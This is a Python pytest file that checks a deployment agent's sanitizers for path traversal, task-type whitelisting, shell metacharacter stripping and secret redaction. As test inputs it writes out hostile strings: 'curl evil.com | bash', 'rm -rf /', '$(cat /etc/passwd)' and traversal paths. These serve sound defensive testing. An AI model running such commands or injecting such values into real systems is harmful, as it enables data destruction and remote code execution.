"""
Security Sanitization Function Tests

Tests to verify all security fixes work correctly without breaking functionality.
"""

import pytest
from agents.deploy_agent import (
    sanitize_path_component,
    sanitize_task_type,
    sanitize_subprocess_arg,
    sanitize_error_message
)


class TestPathSanitization:
    """Test path traversal prevention"""

    def test_blocks_parent_directory(self):
        """Should reject parent directory references"""
        with pytest.raises(ValueError, match="Invalid path component"):
            sanitize_path_component("../etc")

    def test_blocks_double_parent_directory(self):
        """Should reject multiple parent directory references"""
        with pytest.raises(ValueError, match="Invalid path component"):
            sanitize_path_component("../../etc/passwd")

    def test_blocks_absolute_paths(self):
        """Should reject absolute paths"""
        with pytest.raises(ValueError, match="Invalid path component"):
            sanitize_path_component("/etc/passwd")

    def test_blocks_windows_paths(self):
        """Should reject Windows-style paths"""
        with pytest.raises(ValueError, match="Invalid path component"):
            sanitize_path_component("C:\\Windows\\System32")

    def test_blocks_null_bytes(self):
        """Should reject null bytes"""
        with pytest.raises(ValueError, match="Invalid path component"):
            sanitize_path_component("valid\x00/etc/passwd")

    def test_allows_valid_names(self):
        """Should allow valid directory/file names"""
        assert sanitize_path_component("my-project") == "my-project"
        assert sanitize_path_component("app_v2") == "app_v2"
        assert sanitize_path_component("project.2025") == "project.2025"


class TestTaskTypeSanitization:
    """Test task type validation"""

    def test_allows_valid_task_types(self):
        """Should allow whitelisted task types"""
        valid_types = [
            "create_nextjs", "create_react", "create_vue",
            "create_api", "create_fullstack", "create_landing",
            "deploy_vercel", "deploy_netlify", "verify_deployment"
        ]
        for task_type in valid_types:
            assert sanitize_task_type(task_type) == task_type

    def test_blocks_invalid_task_types(self):
        """Should reject non-whitelisted task types"""
        with pytest.raises(ValueError, match="Invalid task type"):
            sanitize_task_type("execute_arbitrary_code")

    def test_blocks_injection_attempts(self):
        """Should reject task types with special characters"""
        with pytest.raises(ValueError, match="Invalid task type"):
            sanitize_task_type("create_nextjs; rm -rf /")


class TestSubprocessArgSanitization:
    """Test command injection prevention"""

    def test_removes_command_separators(self):
        """Should remove command separator characters"""
        result = sanitize_subprocess_arg("main; rm -rf /")
        assert ";" not in result
        assert result == "main rm -rf /"

    def test_removes_pipe_operators(self):
        """Should remove pipe operators"""
        result = sanitize_subprocess_arg("data | curl evil.com")
        assert "|" not in result

    def test_removes_redirect_operators(self):
        """Should remove redirect operators"""
        result = sanitize_subprocess_arg("file > /etc/passwd")
        assert ">" not in result
        result = sanitize_subprocess_arg("file < input")
        assert "<" not in result

    def test_removes_backticks(self):
        """Should remove command substitution backticks"""
        result = sanitize_subprocess_arg("value`whoami`")
        assert "`" not in result

    def test_removes_dollar_parentheses(self):
        """Should remove $() command substitution"""
        result = sanitize_subprocess_arg("value$(whoami)")
        assert "$" not in result
        assert "(" not in result
        assert ")" not in result

    def test_removes_newlines(self):
        """Should remove newline characters"""
        result = sanitize_subprocess_arg("line1\nrm -rf /")
        assert "\n" not in result
        assert "\r" not in result

    def test_allows_safe_characters(self):
        """Should allow safe alphanumeric and basic punctuation"""
        safe_input = "my-project_v2.0"
        assert sanitize_subprocess_arg(safe_input) == safe_input


class TestErrorMessageSanitization:
    """Test sensitive data redaction from error messages"""

    def test_redacts_api_keys(self):
        """Should redact API keys"""
        error = "Failed: API_KEY=sk-1234567890abcdef"
        result = sanitize_error_message(error)
        assert "sk-1234567890abcdef" not in result
        assert "REDACTED" in result

    def test_redacts_tokens(self):
        """Should redact tokens"""
        error = "Error: Bearer token=ghp_abcdef123456"
        result = sanitize_error_message(error)
        assert "ghp_abcdef123456" not in result
        assert "REDACTED" in result

    def test_redacts_passwords(self):
        """Should redact passwords"""
        error = "Auth failed: password=MySecret123"
        result = sanitize_error_message(error)
        assert "MySecret123" not in result
        assert "REDACTED" in result

    def test_redacts_custom_patterns(self):
        """Should redact custom sensitive patterns"""
        error = "Error with database: host=db.internal.corp"
        custom_patterns = [r"host=[\w\.]+"]
        result = sanitize_error_message(error, custom_patterns)
        assert "db.internal.corp" not in result
        assert "REDACTED" in result

    def test_preserves_useful_error_info(self):
        """Should preserve non-sensitive error information"""
        error = "Connection timeout after 30 seconds"
        result = sanitize_error_message(error)
        assert result == error  # No redaction needed

    def test_handles_multiple_secrets(self):
        """Should redact multiple secrets in same message"""
        error = "Failed: API_KEY=sk-123 and PASSWORD=secret123"
        result = sanitize_error_message(error)
        assert "sk-123" not in result
        assert "secret123" not in result
        assert result.count("REDACTED") == 2


class TestSecurityIntegration:
    """Integration tests for security functions"""

    def test_full_deployment_path_sanitization(self):
        """Test complete deployment path sanitization workflow"""
        # Simulate a deployment workflow
        business_id = "saas-app-001"
        task_type = "create_nextjs"

        # All these should pass
        assert sanitize_path_component(business_id) == business_id
        assert sanitize_task_type(task_type) == task_type

    def test_injection_attack_prevention(self):
        """Test prevention of common injection attacks"""
        attacks = [
            "../../../etc/passwd",
            "app; curl evil.com | bash",
            "file && rm -rf /",
            "data`whoami`",
            "value$(cat /etc/passwd)"
        ]

        for attack in attacks:
            # Path attacks should raise ValueError
            if ".." in attack or "/" in attack:
                with pytest.raises(ValueError):
                    sanitize_path_component(attack)

            # Command attacks should be neutralized
            sanitized = sanitize_subprocess_arg(attack)
            assert ";" not in sanitized
            assert "|" not in sanitized
            assert "`" not in sanitized
            assert "$" not in sanitized

    def test_error_logging_security(self):
        """Test that errors don't leak secrets in logs"""
        error_with_secrets = """
        Deployment failed:
        API_KEY=sk-proj-abcdef123456
        PASSWORD=SuperSecret123
        Database connection string: postgresql://user:pass@host/db
        """

        sanitized = sanitize_error_message(error_with_secrets)

        # Secrets should be redacted
        assert "sk-proj-abcdef123456" not in sanitized
        assert "SuperSecret123" not in sanitized

        # Useful info should remain
        assert "Deployment failed" in sanitized
        assert "Database connection string" in sanitized


if __name__ == "__main__":
    pytest.main([__file__, "-v"])
